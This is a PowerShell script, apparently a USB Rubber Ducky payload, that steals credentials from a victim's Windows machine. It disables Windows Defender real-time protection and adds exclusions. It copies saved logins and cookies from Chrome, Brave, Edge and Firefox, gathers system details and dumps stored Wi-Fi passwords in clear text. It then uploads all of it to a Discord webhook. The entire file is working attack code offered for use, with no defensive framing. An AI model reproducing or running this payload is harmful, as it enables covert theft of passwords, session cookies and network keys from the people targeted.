#-- Payload Configuration --#
$DRIVE = 'CIRCUITPY'             
$webhookUrl = "" # Replace with your webhook

# Get drive letter of USB Rubber Ducky
$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $DRIVE }).DeviceID
Set-Location $duckletter

# Disable Windows Defender temporarily
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "${duckletter}\"
Set-MpPreference -ExclusionExtension "ps1"

# Define destination directory
$destDir = "$duckletter\$env:USERNAME"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
        }
    }
}

# Harvest Browser Credentials
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
CopyBrowserFiles "Chrome" $chromeDir @("Login Data")
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
CopyBrowserFiles "Brave" $braveDir @("Login Data")
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
CopyBrowserFiles "Edge" $edgeDir @("Login Data")
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    CopyBrowserFiles "Firefox" $firefoxDir @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
}

# Gather System Information
function GatherSystemInfo {
    $sysInfoDir = "$duckletter\$env:USERNAME\SystemInfo"
    if (-Not (Test-Path $sysInfoDir)) {
        New-Item -ItemType Directory -Path $sysInfoDir
    }

    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
}
GatherSystemInfo

# Retrieve Wi-Fi Passwords
function GetWifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
    $wifiFile = "$duckletter\$env:USERNAME\WiFi_Details.txt"

    $results = @()
    foreach ($profile in $wifiProfiles) {
        $profileDetails = netsh wlan show profile name="$profile" key=clear
        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
        $results += [PSCustomObject]@{
            ProfileName = $profile
            KeyContent  = $keyContent
        }
    }
    $results | Out-File -FilePath $wifiFile
}
GetWifiPasswords

# Function to Upload Harvested Files to Discord Webhook
function SendToDiscord {
    param(
        [string]$filePath
    )
    $fileName = Split-Path -Path $filePath -Leaf
    $body = @{
        "content" = "Harvested Data: $fileName"
    }
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $fileContent = Get-Content -Path $filePath -Raw
    $payload = "--$boundary$LF" +
               "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
               "Content-Type: text/plain$LF$LF" +
               "$fileContent$LF" +
               "--$boundary--$LF"

    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $payload -ErrorAction SilentlyContinue
}

# Send All Harvested Files to Discord
$harvestedFiles = Get-ChildItem -Path "$duckletter\$env:USERNAME" -Recurse -File
foreach ($file in $harvestedFiles) {
    SendToDiscord -filePath $file.FullName
}

# Re-enable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false

exit
